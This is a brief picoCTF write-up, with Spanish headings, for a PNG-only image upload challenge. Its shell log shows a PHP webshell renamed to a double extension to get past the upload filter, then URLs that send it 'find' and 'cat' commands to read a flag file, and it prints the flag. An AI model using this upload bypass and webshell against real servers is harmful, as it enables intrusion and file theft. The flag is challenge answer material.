# Retos PicoCTF


## Objetivo 

I found a web app that can help process images: PNG images only!

Additional details will be available after launching your challenge instance.
## Solución 

```jesus@jesus-ThinkPad-T420:~$ mkdir picoctfretos
jesus@jesus-ThinkPad-T420:~$ cd picoctfretos/
jesus@jesus-ThinkPad-T420:~/picoctfretos$ locate webshells
jesus@jesus-ThinkPad-T420:~/picoctfretos$ locate webshells/php
jesus@jesus-ThinkPad-T420:~/picoctfretos$ touch webshell.php
jesus@jesus-ThinkPad-T420:~/picoctfretos$ nano webshell.php 
jesus@jesus-ThinkPad-T420:~/picoctfretos$ mv webshell.php webshell.png.php
jesus@jesus-ThinkPad-T420:~/picoctfretos$ nano webshell.png.php http://atlas.picoctf.net:62297/uploads/webshell.png.php?cmd=find%20/%20-name%20*txt%202%3E/dev/null

http://atlas.picoctf.net:62297/uploads/webshell.png.php?cmd=cat%20/var/www/html/GQ4DOOBVMMYGK.txt

/* picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_48785c0e} */



```

## Notas adicionales 

## Referencias 
